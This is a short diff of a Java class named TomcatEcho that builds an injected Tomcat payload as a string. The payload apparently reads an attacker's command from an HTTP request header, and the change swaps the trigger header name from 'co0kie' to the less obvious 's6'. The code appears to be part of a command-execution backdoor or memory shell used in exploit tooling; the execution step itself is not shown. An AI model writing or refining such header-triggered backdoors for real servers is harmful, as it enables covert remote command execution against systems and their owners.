@@ -68,8 +68,8 @@ public class TomcatEcho {
                 "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                 "                                    String cmd = null;\n" +
                 "                                    // 从 header 中获取\n" +
-                "                                    if (request.getHeader(\"co0kie\") != null){\n" +
-                "                                        cmd = request.getHeader(\"co0kie\");\n" +
+                "                                    if (request.getHeader(\"s6\") != null){\n" +
+                "                                        cmd = request.getHeader(\"s6\");\n" +
                 "                                    }\n" +
                 "\n" +
                 "                                    if (cmd != null){\n" +
